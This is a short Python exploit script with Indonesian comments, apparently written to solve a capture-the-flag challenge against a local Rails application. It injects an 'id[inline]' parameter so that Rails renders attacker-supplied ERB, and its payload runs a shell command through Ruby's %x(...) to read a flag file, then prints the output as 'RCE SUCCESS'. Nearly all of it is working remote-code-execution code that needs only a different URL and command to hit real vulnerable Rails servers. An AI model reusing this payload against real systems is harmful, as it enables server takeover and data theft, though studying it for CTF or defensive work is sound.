#!/usr/bin/env python3
import requests

# Config
BASE_URL = "http://localhost:1337"
ENDPOINT = "/docs"

# Lokasi flag yang lu temuin tadi (MD5 Filename)
FLAG_FILE = "/ed8ced0a73ed69ad8b986afd93efd404.txt"

def exploit():
    print(f"[*] Target: {BASE_URL}{ENDPOINT}")
    print(f"[*] Flag File: {FLAG_FILE}")
    print("[*] Sending Malicious Payload (Rails render RCE)...")

    # Payload: <%= %x(cat /path/to/flag) %>
    # %x(...) di Ruby sama kayak backtick `...` buat jalanin command shell
    ruby_payload = f"<%= %x(cat {FLAG_FILE}) %>"

    # Parameter Injection: id[inline]
    # Ini memaksa Rails membaca params[:id] sebagai Hash { 'inline' => payload }
    # Akibatnya: render inline: payload -> Eksekusi ERB
    params = {
        'id[inline]': ruby_payload
    }

    try:
        r = requests.get(f"{BASE_URL}{ENDPOINT}", params=params)
        
        if r.status_code == 200:
            print("\n[+] RCE SUCCESS! Response Body:")
            print("-" * 40)
            print(r.text.strip())
            print("-" * 40)
        else:
            print(f"[-] Failed. Status Code: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
